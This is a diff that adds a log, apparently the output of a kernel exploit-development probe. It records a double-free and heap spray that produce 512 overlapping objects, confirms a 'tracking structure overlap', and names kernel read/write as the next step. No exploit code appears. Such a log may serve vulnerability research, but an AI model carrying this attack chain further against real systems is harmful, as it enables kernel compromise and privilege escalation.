@@ -1,0 +1,104 @@
+=== PROBE 67c: OVERLAP ORACLE ===
+pid=642
+eb=0_21ECC000
+fd_zero=22
+
+-- [A] PIN TO 2 CPUs --
+  setaffinity(mask=0x03) rv=0
+  verify mask=0x03
+
+-- [C] DOUBLE-FREE + SPRAY --
+[1] dbl=10 spray=128 baseline_bad=0 polled=64 odd_overlap=64 even_lost=0
+  ★ odd[2]=8723(was=00000003,now=00010003)
+  ★ odd[4]=8721(was=00000003,now=00010003)
+  ★ odd[6]=8719(was=00000003,now=00010003)
+  ★ odd[8]=8717(was=00000003,now=00010003)
+  ★ odd[10]=8715(was=00000003,now=00010003)
+  ★ odd[12]=8713(was=00000003,now=00010003)
+  ★ odd[14]=8711(was=00000003,now=00010003)
+  ★ odd[16]=25093(was=00000003,now=00010003)
+  ★ odd[18]=534(was=00000003,now=00010003)
+  ★ odd[20]=536(was=00000003,now=00010003)
+[2] dbl=6 spray=128 baseline_bad=0 polled=64 odd_overlap=64 even_lost=0
+  ★ odd[2]=17014(was=00000003,now=00010003)
+  ★ odd[4]=17016(was=00000003,now=00010003)
+  ★ odd[6]=17018(was=00000003,now=00010003)
+  ★ odd[8]=17020(was=00000003,now=00010003)
+  ★ odd[10]=17022(was=00000003,now=00010003)
+  ★ odd[12]=17024(was=00000003,now=00010003)
+  ★ odd[14]=17026(was=00000003,now=00010003)
+  ★ odd[16]=17028(was=00000003,now=00010003)
+  ★ odd[18]=8819(was=00000003,now=00010003)
+  ★ odd[20]=8817(was=00000003,now=00010003)
+[3] dbl=3 spray=128 baseline_bad=0 polled=64 odd_overlap=64 even_lost=0
+  ★ odd[2]=33286(was=00000003,now=00010003)
+  ★ odd[4]=33288(was=00000003,now=00010003)
+  ★ odd[6]=33290(was=00000003,now=00010003)
+  ★ odd[8]=33292(was=00000003,now=00010003)
+  ★ odd[10]=33294(was=00000003,now=00010003)
+  ★ odd[12]=33296(was=00000003,now=00010003)
+  ★ odd[14]=33298(was=00000003,now=00010003)
+  ★ odd[16]=33300(was=00000003,now=00010003)
+  ★ odd[18]=16918(was=00000003,now=00010003)
+  ★ odd[20]=16920(was=00000003,now=00010003)
+[4] dbl=6 spray=128 baseline_bad=0 polled=64 odd_overlap=64 even_lost=0
+  ★ odd[2]=41603(was=00000003,now=00010003)
+  ★ odd[4]=41601(was=00000003,now=00010003)
+  ★ odd[6]=41599(was=00000003,now=00010003)
+  ★ odd[8]=41597(was=00000003,now=00010003)
+  ★ odd[10]=41595(was=00000003,now=00010003)
+  ★ odd[12]=41593(was=00000003,now=00010003)
+  ★ odd[14]=41591(was=00000003,now=00010003)
+  ★ odd[16]=41589(was=00000003,now=00010003)
+  ★ odd[18]=25203(was=00000003,now=00010003)
+  ★ odd[20]=25201(was=00000003,now=00010003)
+[5] dbl=4 spray=128 baseline_bad=0 polled=64 odd_overlap=64 even_lost=0
+  ★ odd[2]=57875(was=00000003,now=00010003)
+  ★ odd[4]=57873(was=00000003,now=00010003)
+  ★ odd[6]=57871(was=00000003,now=00010003)
+  ★ odd[8]=57869(was=00000003,now=00010003)
+  ★ odd[10]=57867(was=00000003,now=00010003)
+  ★ odd[12]=57865(was=00000003,now=00010003)
+  ★ odd[14]=57863(was=00000003,now=00010003)
+  ★ odd[16]=8709(was=00000003,now=00010003)
+  ★ odd[18]=33302(was=00000003,now=00010003)
+  ★ odd[20]=33304(was=00000003,now=00010003)
+[6] dbl=6 spray=128 baseline_bad=0 polled=64 odd_overlap=64 even_lost=0
+  ★ odd[2]=630(was=00000003,now=00010003)
+  ★ odd[4]=632(was=00000003,now=00010003)
+  ★ odd[6]=634(was=00000003,now=00010003)
+  ★ odd[8]=636(was=00000003,now=00010003)
+  ★ odd[10]=638(was=00000003,now=00010003)
+  ★ odd[12]=640(was=00000003,now=00010003)
+  ★ odd[14]=642(was=00000003,now=00010003)
+  ★ odd[16]=644(was=00000003,now=00010003)
+  ★ odd[18]=41587(was=00000003,now=00010003)
+  ★ odd[20]=41585(was=00000003,now=00010003)
+[7] dbl=6 spray=128 baseline_bad=0 polled=64 odd_overlap=64 even_lost=0
+  ★ odd[2]=16902(was=00000003,now=00010003)
+  ★ odd[4]=16904(was=00000003,now=00010003)
+  ★ odd[6]=16906(was=00000003,now=00010003)
+  ★ odd[8]=16908(was=00000003,now=00010003)
+  ★ odd[10]=16910(was=00000003,now=00010003)
+  ★ odd[12]=16912(was=00000003,now=00010003)
+  ★ odd[14]=16914(was=00000003,now=00010003)
+  ★ odd[16]=16916(was=00000003,now=00010003)
+  ★ odd[18]=49686(was=00000003,now=00010003)
+  ★ odd[20]=49688(was=00000003,now=00010003)
+[8] dbl=4 spray=128 baseline_bad=0 polled=64 odd_overlap=64 even_lost=0
+  ★ odd[2]=25219(was=00000003,now=00010003)
+  ★ odd[4]=25217(was=00000003,now=00010003)
+  ★ odd[6]=25215(was=00000003,now=00010003)
+  ★ odd[8]=25213(was=00000003,now=00010003)
+  ★ odd[10]=25211(was=00000003,now=00010003)
+  ★ odd[12]=25209(was=00000003,now=00010003)
+  ★ odd[14]=25207(was=00000003,now=00010003)
+  ★ odd[16]=25205(was=00000003,now=00010003)
+  ★ odd[18]=57971(was=00000003,now=00010003)
+  ★ odd[20]=57969(was=00000003,now=00010003)
+
+TOTAL OVERLAPS DETECTED: 512
+★★★ TRACKING STRUCTURE OVERLAP CONFIRMED ★★★
+Next: exploit shared tracking structure for kernel R/W
+alive=YES
+=== 67c DONE ===
